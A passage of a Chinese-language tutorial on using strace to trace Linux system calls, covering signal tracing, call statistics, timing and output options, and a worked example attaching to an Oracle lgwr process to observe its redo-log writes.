class=\"hljs-subst\">\\0</span><span class=\"hljs-subst\">\\0</span>\\200X\\1\"</span><span class=\"hljs-operator\">...</span>, <span class=\"hljs-number\">512</span>) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">512</span>\nfstat64(<span class=\"hljs-number\">3</span>, {st_mode<span class=\"hljs-operator\">=</span><span class=\"hljs-type\">S_IFREG</span><span class=\"hljs-operator\">|</span><span class=\"hljs-number\">0755</span>, st_size<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1571692</span>, <span class=\"hljs-operator\">...</span>}) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>\nold_mmap(<span class=\"hljs-type\">NULL</span>, <span class=\"hljs-number\">4096</span>, <span class=\"hljs-type\">PROT_READ</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">PROT_WRITE</span>, <span class=\"hljs-type\">MAP_PRIVATE</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">MAP_ANONYMOUS</span>, <span class=\"hljs-operator\">-</span><span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0xbf5ee000</span>\nold_mmap(<span class=\"hljs-type\">NULL</span>, <span class=\"hljs-number\">1275340</span>, <span class=\"hljs-type\">PROT_READ</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">PROT_EXEC</span>, <span class=\"hljs-type\">MAP_PRIVATE</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">0</span>) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0xa02000</span>\nold_mmap(<span class=\"hljs-number\">0xb34000</span>, <span class=\"hljs-number\">12288</span>, <span class=\"hljs-type\">PROT_READ</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">PROT_WRITE</span>, <span class=\"hljs-type\">MAP_PRIVATE</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">MAP_FIXED</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">0x132000</span>) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0xb34000</span>\nold_mmap(<span class=\"hljs-number\">0xb37000</span>, <span class=\"hljs-number\">9676</span>, <span class=\"hljs-type\">PROT_READ</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">PROT_WRITE</span>, <span class=\"hljs-type\">MAP_PRIVATE</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">MAP_FIXED</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">MAP_ANONYMOUS</span>, <span class=\"hljs-operator\">-</span><span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0xb37000</span>\nclose(<span class=\"hljs-number\">3</span>)                                <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>\nset_thread_area({entry_number:<span class=\"hljs-operator\">-</span><span class=\"hljs-number\">1</span> -&gt; <span class=\"hljs-number\">6</span>, base_addr:<span class=\"hljs-number\">0xbf5ee740</span>, limit:<span class=\"hljs-number\">1048575</span>, seg_32bit:<span class=\"hljs-number\">1</span>, contents:<span class=\"hljs-number\">0</span>, read_exec_only:<span class=\"hljs-number\">0</span>, limit_in_pages:<span class=\"hljs-number\">1</span>, seg_not_present:<span class=\"hljs-number\">0</span>, useable:<span class=\"hljs-number\">1</span>}) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>\nmunmap(<span class=\"hljs-number\">0xbf5ef000</span>, <span class=\"hljs-number\">65900</span>)               <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>\nfstat64(<span class=\"hljs-number\">0</span>, {st_mode<span class=\"hljs-operator\">=</span><span class=\"hljs-type\">S_IFCHR</span><span class=\"hljs-operator\">|</span><span class=\"hljs-number\">0620</span>, st_rdev<span class=\"hljs-operator\">=</span>makedev(<span class=\"hljs-number\">136</span>, <span class=\"hljs-number\">0</span>), <span class=\"hljs-operator\">...</span>}) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>\nmmap2(<span class=\"hljs-type\">NULL</span>, <span class=\"hljs-number\">4096</span>, <span class=\"hljs-type\">PROT_READ</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">PROT_WRITE</span>, <span class=\"hljs-type\">MAP_PRIVATE</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">MAP_ANONYMOUS</span>, <span class=\"hljs-operator\">-</span><span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0xbf5ff000</span>\nread(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">99</span>\n<span class=\"hljs-string\">\"99<span class=\"hljs-subst\">\\n</span>\"</span>, <span class=\"hljs-number\">1024</span>)                   <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">3</span>\nfstat64(<span class=\"hljs-number\">1</span>, {st_mode<span class=\"hljs-operator\">=</span><span class=\"hljs-type\">S_IFCHR</span><span class=\"hljs-operator\">|</span><span class=\"hljs-number\">0620</span>, st_rdev<span class=\"hljs-operator\">=</span>makedev(<span class=\"hljs-number\">136</span>, <span class=\"hljs-number\">0</span>), <span class=\"hljs-operator\">...</span>}) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>\nmmap2(<span class=\"hljs-type\">NULL</span>, <span class=\"hljs-number\">4096</span>, <span class=\"hljs-type\">PROT_READ</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">PROT_WRITE</span>, <span class=\"hljs-type\">MAP_PRIVATE</span><span class=\"hljs-operator\">|</span><span class=\"hljs-type\">MAP_ANONYMOUS</span>, <span class=\"hljs-operator\">-</span><span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>) <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0xbf5fe000</span>\nwrite(<span class=\"hljs-number\">1</span>, <span class=\"hljs-string\">\"000000099<span class=\"hljs-subst\">\\n</span>\"</span>, <span class=\"hljs-number\">10000000099</span>\n)             <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">10</span>\nmunmap(<span class=\"hljs-number\">0xbf5fe000</span>, <span class=\"hljs-number\">4096</span>)                <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>\nexit_group(<span class=\"hljs-number\">0</span>)                           <span class=\"hljs-operator\">=</span> <span class=\"hljs-operator\">?</span>\n</code></pre>\n<p>从trace结构可以看到，系统首先调用execve开始一个新的进行，接着进行些环境的初始化操作，最后停顿在”read(0,”上面，这也就是执行到了我们的scanf函数，等待我们输入数字呢，在输入完99之后，在调用write函数将格式化后的数值”000000099″输出到屏幕，最后调用exit_group退出进行，完成整个程序的执行过程。</p>\n<p> <strong>跟踪信号传递</strong> </p>\n<p>我们还是使用上面的那个test程序，来观察进程接收信号的情况。还是先<code>strace ./test</code>，等到等待输入的画面的时候不要输入任何东西，然后打开另外一个窗口，输入如下的命令</p>\n<pre><code class=\"language-shell\">killall <span class=\"hljs-built_in\">test</span>\n</code></pre>\n<p>这时候就能看到我们的程序推出了，最后的trace结果如下：</p>\n<pre><code class=\"language-shell\">oracle@orainst[orcl]:~\n$strace ./test\n\n<span class=\"hljs-function\"><span class=\"hljs-title\">execve</span><span class=\"hljs-params\">(<span class=\"hljs-string\">\"./test\"</span>, [<span class=\"hljs-string\">\"./test\"</span>], [/* <span class=\"hljs-number\">41</span> vars */])</span> = 0\n<span class=\"hljs-title\">uname</span><span class=\"hljs-params\">({sys=<span class=\"hljs-string\">\"Linux\"</span>, node=<span class=\"hljs-string\">\"orainst.desktop.mycompany.com\"</span>, ...})</span> = 0\n<span class=\"hljs-title\">brk</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>)</span>                                  = 0<span class=\"hljs-title\">x9ae2000</span>\n<span class=\"hljs-title\">old_mmap</span><span class=\"hljs-params\">(NULL, <span class=\"hljs-number\">65900</span>, PROT_READ, MAP_PRIVATE, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">0</span>)</span> = 0<span class=\"hljs-title\">xbf5ef000</span>\n<span class=\"hljs-title\">close</span><span class=\"hljs-params\">(<span class=\"hljs-number\">3</span>)</span>                                = 0\n<span class=\"hljs-title\">open</span><span class=\"hljs-params\">(<span class=\"hljs-string\">\"/lib/tls/libc.so.6\"</span>, O_RDONLY)</span>    = 3\n<span class=\"hljs-title\">read</span><span class=\"hljs-params\">(<span class=\"hljs-number\">3</span>, <span class=\"hljs-string\">\"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\200X\\1\"</span>..., <span class=\"hljs-number\">512</span>)</span> = 512\n<span class=\"hljs-title\">fstat64</span><span class=\"hljs-params\">(<span class=\"hljs-number\">3</span>, {st_mode=S_IFREG|<span class=\"hljs-number\">0755</span>, st_size=<span class=\"hljs-number\">1571692</span>, ...})</span> = 0\n<span class=\"hljs-title\">old_mmap</span><span class=\"hljs-params\">(NULL, <span class=\"hljs-number\">4096</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>)</span> = 0<span class=\"hljs-title\">xbf5ee000</span>\n<span class=\"hljs-title\">old_mmap</span><span class=\"hljs-params\">(NULL, <span class=\"hljs-number\">1275340</span>, PROT_READ|PROT_EXEC, MAP_PRIVATE, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">0</span>)</span> = 0<span class=\"hljs-title\">x2e9000</span>\n<span class=\"hljs-title\">old_mmap</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x41b000, <span class=\"hljs-number\">12288</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">0</span>x132000)</span> = 0<span class=\"hljs-title\">x41b000</span>\n<span class=\"hljs-title\">old_mmap</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x41e000, <span class=\"hljs-number\">9676</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>)</span> = 0<span class=\"hljs-title\">x41e000</span>\n<span class=\"hljs-title\">close</span><span class=\"hljs-params\">(<span class=\"hljs-number\">3</span>)</span>                                = 0\n<span class=\"hljs-title\">set_thread_area</span><span class=\"hljs-params\">({entry_number:-<span class=\"hljs-number\">1</span> -&gt; <span class=\"hljs-number\">6</span>, base_addr:<span class=\"hljs-number\">0</span>xbf5ee740, limit:<span class=\"hljs-number\">1048575</span>, seg_32bit:<span class=\"hljs-number\">1</span>, contents:<span class=\"hljs-number\">0</span>, read_exec_only:<span class=\"hljs-number\">0</span>, limit_in_pages:<span class=\"hljs-number\">1</span>, seg_not_present:<span class=\"hljs-number\">0</span>, useable:<span class=\"hljs-number\">1</span>})</span> = 0\n<span class=\"hljs-title\">munmap</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>xbf5ef000, <span class=\"hljs-number\">65900</span>)</span>               = 0\n<span class=\"hljs-title\">fstat64</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>, {st_mode=S_IFCHR|<span class=\"hljs-number\">0620</span>, st_rdev=makedev(<span class=\"hljs-number\">136</span>, <span class=\"hljs-number\">0</span>), ...})</span> = 0\n<span class=\"hljs-title\">mmap2</span><span class=\"hljs-params\">(NULL, <span class=\"hljs-number\">4096</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>)</span> = 0<span class=\"hljs-title\">xbf5ff000</span>\n<span class=\"hljs-title\">read</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>xbf5ff000, <span class=\"hljs-number\">1024</span>)</span>               = ? ERESTARTSYS <span class=\"hljs-params\">(To be restarted)</span>\n--- SIGTERM <span class=\"hljs-params\">(Terminated)</span> @ 0 <span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>)</span> ---\n+++ <span class=\"hljs-title\">killed</span> <span class=\"hljs-title\">by</span> SIGTERM +++</span>\n</code></pre>\n<p>trace中很清楚的告诉你test进程”+++ killed by SIGTERM +++”。</p>\n<p> <strong>系统调用统计</strong> </p>\n<p>strace不光能追踪系统调用，通过使用参数-c，它还能将进程所有的系统调用做一个统计分析给你，下面就来看看strace的统计，这次我们执行带-c参数的strace：</p>\n<p>strace -c ./test</p>\n<p>最后能得到这样的trace结果：</p>\n<pre><code class=\"language-shell\">oracle<span class=\"hljs-variable\">@orainst</span>[orcl]<span class=\"hljs-symbol\">:~</span>\n<span class=\"hljs-variable\">$strace</span> -c ./test\n</code></pre>\n<pre><code class=\"language-shell\">execve<span class=\"hljs-params\">(\"./test\", [\"./test\"], [/* 41 vars */])</span> = 0\n% time     seconds  usecs/call     calls    errors syscall\n<span class=\"hljs-params\">------</span> <span class=\"hljs-params\">-----------</span> <span class=\"hljs-params\">-----------</span> <span class=\"hljs-params\">---------</span> <span class=\"hljs-params\">---------</span> <span class=\"hljs-params\">----------------</span>\n 45.90    0.000140           5        27        25 open\n 34.43    0.000105           4        24        21 stat64\n  7.54    0.000023           5         5           old_mmap\n  2.62    0.000008           8         1           munmap\n  1.97    0.000006           6         1           uname\n  1.97    0.000006           2         3           fstat64\n  1.64    0.000005           3         2         1 read\n  1.31    0.000004           2         2           close\n  0.98    0.000003           3         1           brk\n  0.98    0.000003           3         1           mmap2\n  0.66    0.000002           2         1           <span class=\"hljs-keyword\">set</span>_thread_area\n<span class=\"hljs-params\">------</span> <span class=\"hljs-params\">-----------</span> <span class=\"hljs-params\">-----------</span> <span class=\"hljs-params\">---------</span> <span class=\"hljs-params\">---------</span> <span class=\"hljs-params\">----------------</span>\n100.00    0.000305                    68        47 total\n</code></pre>\n<p>这里很清楚的告诉你调用了那些系统函数，调用次数多少，消耗了多少时间等等这些信息，这个对我们分析一个程序来说是非常有用的。</p>\n<h3 id=\"常用参数说明\">常用参数说明</h3>\n<p>除了-c参数之外，strace还提供了其他有用的参数给我们，让我们能很方便的得到自己想要的信息，下面就对那些常用的参数一一做个介绍。</p>\n<p> <strong>重定向输出</strong> </p>\n<p>参数-o用在将strace的结果输出到文件中，如果不指定-o参数的话，默认的输出设备是STDERR，也就是说使用”-o filename”和” 2&gt;filename”的结果是一样的。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 这两个命令都是将strace结果输出到文件test.txt中</span>\nstrace -c -o <span class=\"hljs-keyword\">test</span>.txt ./<span class=\"hljs-keyword\">test</span>\nstrace -c ./<span class=\"hljs-keyword\">test</span>  <span class=\"hljs-number\">2</span>&gt;<span class=\"hljs-keyword\">test</span>.txt\n</code></pre>\n<p> <strong>对系统调用进行计时</strong> </p>\n<p>strace可以使用参数-T将每个系统调用所花费的时间打印出来，每个调用的时间花销现在在调用行最右边的尖括号里面。</p>\n<pre><code class=\"language-shell\">oracle@orainst[orcl]:~\n$strace -T ./test\n\n// 这里只摘录部分结果\n<span class=\"hljs-function\"><span class=\"hljs-title\">read</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>\n<span class=\"hljs-string\">\"1\\n\"</span>, <span class=\"hljs-number\">1024</span>)</span>                    = 2 &lt;2.673455&gt;\n<span class=\"hljs-title\">fstat64</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>, {st_mode=S_IFCHR|<span class=\"hljs-number\">0620</span>, st_rdev=makedev(<span class=\"hljs-number\">136</span>, <span class=\"hljs-number\">0</span>), ...})</span> = 0 &lt;0.000014&gt;\n<span class=\"hljs-title\">mmap2</span><span class=\"hljs-params\">(NULL, <span class=\"hljs-number\">4096</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>)</span> = 0<span class=\"hljs-title\">xbf5fe000</span> &lt;0.000017&gt;\n<span class=\"hljs-title\">write</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>, <span class=\"hljs-string\">\"000000001\\n\"</span>, <span class=\"hljs-number\">10000000001</span>\n)</span>             = 10 &lt;0.000016&gt;\n<span class=\"hljs-title\">munmap</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>xbf5fe000, <span class=\"hljs-number\">4096</span>)</span>                = 0 &lt;0.000020&gt;\n<span class=\"hljs-title\">exit_group</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>)</span>                           = ?</span>\n</code></pre>\n<p> <strong>系统调用的时间</strong> </p>\n<p>这是一个很有用的功能，strace会将每次系统调用的发生时间记录下来，只要使用-t/tt/ttt三个参数就可以看到效果了，具体的例子可以自己去尝试。</p>\n<table>\n<thead>\n<tr>\n<th>参数名</th>\n<th>输出样式</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-t</td>\n<td>10:33:04 exit_group(0)</td>\n<td>输出结果精确到秒</td>\n</tr>\n<tr>\n<td>-tt</td>\n<td>10:33:48.159682 exit_group(0)</td>\n<td>输出结果精确到微妙</td>\n</tr>\n<tr>\n<td>-ttt</td>\n<td>1262169244.788478 exit_group(0)</td>\n<td>精确到微妙，而且时间表示为unix时间戳</td>\n</tr>\n</tbody></table>\n<p> <strong>截断输出</strong> </p>\n<p>-s参数用于指定trace结果的每一行输出的字符串的长度，下面看看test程序中-s参数对结果有什么影响，现指定-s为20，然后在read的是是很我们输入一个超过20个字符的数字串</p>\n<pre><code class=\"language-shell\">strace -s <span class=\"hljs-number\">20</span> ./test\n\nread(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">2222222222222222222222222</span>      <span class=\"hljs-regexp\">//</span> 我们输入的<span class=\"hljs-number\">2</span>一共有<span class=\"hljs-number\">25</span>个\n<span class=\"hljs-string\">\"22222222222222222222\"</span>..., <span class=\"hljs-number\">1024</span>) = <span class=\"hljs-number\">26</span>  <span class=\"hljs-regexp\">//</span> 而我们看到的结果中<span class=\"hljs-number\">2</span>只有<span class=\"hljs-number\">20</span>个\n</code></pre>\n<p> <strong>trace一个现有的进程</strong> </p>\n<p>strace不光能自己初始化一个进程进行trace，还能追踪现有的进程，参数-p就是取这个作用的，用法也很简单，具体如下。</p>\n<pre><code class=\"language-shell\">strace -<span class=\"hljs-selector-tag\">p</span> pid\n</code></pre>\n<h3 id=\"综合例子\">综合例子</h3>\n<p>说了那么多的功能和参数，现在我们来一个实用点的，就是研究下Oracle的lgwr进程，看看这个进程是不是像文档所说的那样没3s钟写一次log文件，考虑到lgwr写日志的触发条件比较多，我们需要找一个空闲的Oracle实例做这个实验。</p>\n<p>我们先要得到lgwr进程的pid，运行下面的命令</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ps</span> -ef|grep lgwr\n\n<span class=\"hljs-attribute\">oracle</span>    <span class=\"hljs-number\">5912</span>     <span class=\"hljs-number\">1</span>  <span class=\"hljs-number\">0</span> Nov12 ?        <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">56</span> ora_lgwr_orcl\n</code></pre>\n<p>得到lgwr的pid是5912，现在启动strace，然后将trace的几个输出到lgwr.txt文件中，执行下面的命令</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">strace</span> -tt -s <span class=\"hljs-number\">10</span> -o lgwr.txt -p <span class=\"hljs-number\">5912</span>\n</code></pre>\n<p>过一会之后停止strace，然后查看结果。由于输出的结果比较多，为了方便我们只看Oracle写入log文件时用的pwrite函数的调用</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">grep</span> pwrite\\(<span class=\"hljs-number\">20</span> lgwr.txt\n</code></pre>\n<p>等等，为什么grep的时候用的是”pwrite(2″呢？，因为我知道我这个机器打开的当前的log文件的句柄编号都是2开始的。具体查找方法是先使用下面的语句找出当前活动的日志文件都有哪些：</p>\n<pre><code class=\"language-shell\">select member, v<span class=\"hljs-symbol\">$</span><span class=\"hljs-built_in\">log</span>.status from v<span class=\"hljs-symbol\">$</span><span class=\"hljs-built_in\">log</span>, v<span class=\"hljs-symbol\">$</span>logfile\nwhere v<span class=\"hljs-symbol\">$</span><span class=\"hljs-built_in\">log</span>.group#=v<span class=\"hljs-symbol\">$</span>logfile.group#;\n</code></pre>\n<p>得到</p>\n<pre><code class=\"language-shell\">MEMBER                                             STATUS\n-------------------------------------------------- ----------------\n<span class=\"hljs-regexp\">/db/</span>databases<span class=\"hljs-regexp\">/orcl/</span>redo-<span class=\"hljs-number\">01</span>-a/redo-t01-g03-m1.log    INACTIVE\n<span class=\"hljs-regexp\">/db/</span>databases<span class=\"hljs-regexp\">/orcl/</span>redo-<span class=\"hljs-number\">03</span>-a/redo-t01-g03-m2.log    INACTIVE\n<span class=\"hljs-regexp\">/db/</span>databases<span class=\"hljs-regexp\">/orcl/</span>redo-<span class=\"hljs-number\">02</span>-a/redo-t01-g02-m1.log    CURRENT\n<span class=\"hljs-regexp\">/db/</span>databases<span class=\"hljs-regexp\">/orcl/</span>redo-<span class=\"hljs-number\">04</span>-a/redo-t01-g02-m2.log    CURRENT\n<span class=\"hljs-regexp\">/db/</span>databases<span class=\"hljs-regexp\">/orcl/</span>redo-<span class=\"hljs-number\">01</span>-a/redo-t01-g01-m1.log    INACTIVE\n<span class=\"hljs-regexp\">/db/</span>databases<span class=\"hljs-regexp\">/orcl/</span>redo-<span class=\"hljs-number\">03</span>-a/redo-t01-g01-m2.log    INACTIVE\n<span class=\"hljs-regexp\">/db/</span>databases<span class=\"hljs-regexp\">/orcl/</span>redo-<span class=\"hljs-number\">02</span>-a/redo-t01-g04-m1.log    INACTIVE\n<span class=\"hljs-regexp\">/db/</span>databases<span class=\"hljs-regexp\">/orcl/</span>redo-<span class=\"hljs-number\">04</span>-a/redo-t01-g04-m2.log    INACTIVE\n</code></pre>\n<p>然后到/proc中去找打开文件的句柄：</p>\n<pre><code class=\"language-shell\">ll <span class=\"hljs-regexp\">/proc/</span>.<span class=\"hljs-number\">5912</span><span class=\"hljs-regexp\">/fd/</span>\n</code></pre>\n<p>得到</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lrwx</span>------    <span class=\"hljs-number\">1</span> oracle   dba            <span class=\"hljs-number\">64</span> Dec <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">55</span> <span class=\"hljs-number\">18</span> -&gt; /db/databases/orcl/redo-<span class=\"hljs-number\">01</span>-a/redo-t01-g01-m1.log\n<span class=\"hljs-attribute\">lrwx</span>------    <span class=\"hljs-number\">1</span> oracle   dba            <span class=\"hljs-number\">64</span> Dec <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">55</span> <span class=\"hljs-number\">19</span> -&gt; /db/databases/orcl/redo-<span class=\"hljs-number\">03</span>-a/redo-t01-g01-m2.log\n<span class=\"hljs-attribute\">lrwx</span>------    <span class=\"hljs-number\">1</span> oracle   dba            <span class=\"hljs-number\">64</span> Dec <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">55</span> <span class=\"hljs-number\">20</span> -&gt; /db/databases/orcl/redo-<span class=\"hljs-number\">02</span>-a/redo-t01-g02-m1.log\n<span class=\"hljs-attribute\">lrwx</span>------    <span class=\"hljs-number\">1</span> oracle   dba            <span class=\"hljs-number\">64</span> Dec <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">55</span> <span class=\"hljs-number\">21</span> -&gt; /db/databases/orcl/redo-<span class=\"hljs-number\">04</span>-a/redo-t01-g02-m2.log\n<span class=\"hljs-attribute\">lrwx</span>------    <span class=\"hljs-number\">1</span> oracle   dba            <span class=\"hljs-number\">64</span> Dec <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">55</span> <span class=\"hljs-number\">22</span> -&gt; /db/databases/orcl/redo-<span class=\"hljs-number\">01</span>-a/redo-t01-g03-m1.log\n<span class=\"hljs-attribute\">lrwx</span>------    <span class=\"hljs-number\">1</span> oracle   dba            <span class=\"hljs-number\">64</span> Dec <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">55</span> <span class=\"hljs-number\">23</span> -&gt; /db/databases/orcl/redo-<span class=\"hljs-number\">03</span>-a/redo-t01-g03-m2.log\n<span class=\"hljs-attribute\">lrwx</span>------    <span class=\"hljs-number\">1</span> oracle   dba            <span class=\"hljs-number\">64</span> Dec <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">55</span> <span class=\"hljs-number\">24</span> -&gt; /db/databases/orcl/redo-<span class=\"hljs-number\">02</span>-a/redo-t01-g04-m1.log\n<span class=\"hljs-attribute\">lrwx</span>------    <span class=\"hljs-number\">1</span> oracle   dba            <span class=\"hljs-number\">64</span> Dec <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">55</span> <span class=\"hljs-number\">25</span> -&gt; /db/databases/orcl/redo-<span class=\"hljs-number\">04</span>-a/redo-t01-g04-m2.log\n</code></pre>\n<p>现在能看到我机器当前日志文件的句柄分别是20和21。</p>\n<p>现在我们得到如下结果</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">55</span>.<span class=\"hljs-number\">603245</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0J!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4363264</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">55</span>.<span class=\"hljs-number\">603569</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0J!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4363264</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">55</span>.<span class=\"hljs-number\">606888</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0M!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4364800</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">55</span>.<span class=\"hljs-number\">607172</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0M!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4364800</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">55</span>.<span class=\"hljs-number\">607934</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0P!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4366336</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">55</span>.<span class=\"hljs-number\">608199</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0P!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4366336</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">55</span>.<span class=\"hljs-number\">610260</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0S!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4367872</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">55</span>.<span class=\"hljs-number\">610530</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0S!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4367872</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">602446</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0V!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4369408</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">602750</span> pwrite(<span class=\"hljs-number\">21</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0V!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4369408</span>) = <span class=\"hljs-number\">1536</span>\n<span class=\"hljs-attribute\">11</span>:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">00</span>.<span class=\"hljs-number\">606386</span> pwrite(<span class=\"hljs-number\">20</span>, <span class=\"hljs-string\">\"\\1\\\"\\0\\0Y!\"</span>..., <span class=\"hljs-number\">1536</span>, <span class=\"hljs-number\">4370944</span>) = <span class=\"hljs-number\">1536</span>\n<span 